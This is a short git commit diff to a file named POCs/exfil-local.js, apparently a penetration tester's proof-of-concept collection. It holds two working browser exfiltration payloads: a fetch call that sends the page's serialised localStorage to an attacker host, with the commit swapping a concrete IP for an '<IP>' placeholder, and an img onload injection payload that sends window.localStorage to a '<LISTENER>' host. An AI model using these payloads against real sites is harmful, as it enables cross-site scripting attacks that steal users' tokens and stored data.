6e807ed73925b415805c0adac1a6cd0aeb171502
SquallForger24 <159946529+SquallForger24@users.noreply.github.com>
2024-03-12 13:17:24 -0700

    Update exfil-local.js

--- POCs/exfil-local.js
+++ POCs/exfil-local.js
@@ -1,7 +1,7 @@
 EX1:
 let data = JSON.stringify(localStorage)
 let encodedData = encodeURIComponent(data)
-fetch("http://192.168.49.51/exfil?data=" + encodedData)
+fetch("http://<IP>/exfil?data=" + encodedData)
 
 EX2:
 <img src=<existing_image> onload=this.src="http://<LISTENER>/?a="+encodeURIComponent(JSON.stringify(window.localStorage))>
